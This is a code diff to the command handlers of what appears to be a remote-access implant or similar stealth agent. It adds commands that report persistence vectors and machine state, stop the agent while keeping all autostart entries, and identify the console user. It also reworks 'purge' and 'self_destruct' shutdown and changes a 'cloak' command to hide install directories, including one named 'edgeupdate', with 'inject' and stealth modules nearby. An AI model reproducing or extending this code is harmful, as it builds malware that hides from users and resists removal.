@@ -784,8 +784,8 @@ def cmd_help(agent, argument: str) -> str:
 @command("exit")
 def cmd_exit(agent, argument: str) -> None:
     agent.reply("goodbye")
-    time.sleep(0.3)
-    os._exit(0)
+    threading.Thread(target=lambda: (time.sleep(0.3), agent.shutdown(0)),
+                     daemon=True).start()
 
 
 @command("deps.status")
@@ -867,11 +867,50 @@ def cmd_guardian_install(agent, argument: str):
     return "\n".join(guardian.install()) or "nothing to do"
 
 
+@command("persist.report")
+def cmd_persist_report(agent, argument: str):
+    """Declare every vector and every machine-wide change we made."""
+    import json as _json
+    from . import persistence
+    return _json.dumps(persistence.report(), indent=1, default=str)
+
+
+@command("state.show")
+def cmd_state_show(agent, argument: str):
+    import json as _json
+    from . import machine_state
+    return _json.dumps(machine_state.load(), indent=1, default=str)
+
+
+@command("state.forget")
+def cmd_state_forget(agent, argument: str):
+    from . import machine_state
+    machine_state.forget(argument.strip())
+    return f"forgot {argument.strip() or 'everything'}"
+
+
+@command("session")
+def cmd_session(agent, argument: str):
+    from . import session
+    return (f"session     {session.current_session()}\n"
+            f"headless    {session.is_headless()}\n"
+            f"console     {session.console_session()}\n"
+            f"console user {session.console_user() or '(none)'}")
+
+
+@command("stop")
+def cmd_stop(agent, argument: str) -> None:
+    """Kill the agent but keep every autostart vector."""
+    agent.reply("stopping (vectors kept)")
+    threading.Thread(target=lambda: (time.sleep(0.4), agent.shutdown(0)),
+                     daemon=True).start()
+
+
 @command("purge")
 def cmd_purge(agent, argument: str):
     agent.reply("purging...")
-    threading.Thread(target=lambda: (time.sleep(0.5), persistence.purge(), os._exit(0)),
-                     daemon=True).start()
+    threading.Thread(target=lambda: (time.sleep(0.5), persistence.purge(),
+                                     agent.shutdown(0)), daemon=True).start()
 
 
 @command("uninstall", "self_destruct")
@@ -887,7 +926,7 @@ def cmd_uninstall(agent, argument: str) -> None:
         time.sleep(0.5)
         from .. import config
         persistence.remove(keep_anchor=config.protected())
-        os._exit(0)
+        agent.shutdown(0)
 
     import threading
     threading.Thread(target=_do_remove, daemon=True).start()
@@ -1013,11 +1052,11 @@ def cmd_inject(agent, argument: str) -> str:
 def cmd_cloak(agent, argument: str) -> str:
     path = argument.strip("'\" ")
     if not path:
-        target = stealth.primary_directory()
-        count = cloak.cloak_tree(target)
-        return f"cloaked primary directory ({count} items)"
+        count = cloak.cloak_install_directories()
+        return f"cloaked install directories ({count} items)"
     if os.path.isdir(path):
-        count = cloak.cloak_tree(path)
+        selective = os.path.basename(os.path.abspath(path)).lower() == "edgeupdate"
+        count = cloak.cloak_tree(path, selective=selective)
         return f"cloaked directory {path} ({count} items)"
     elif os.path.isfile(path):
         ok = cloak.cloak_path(path)
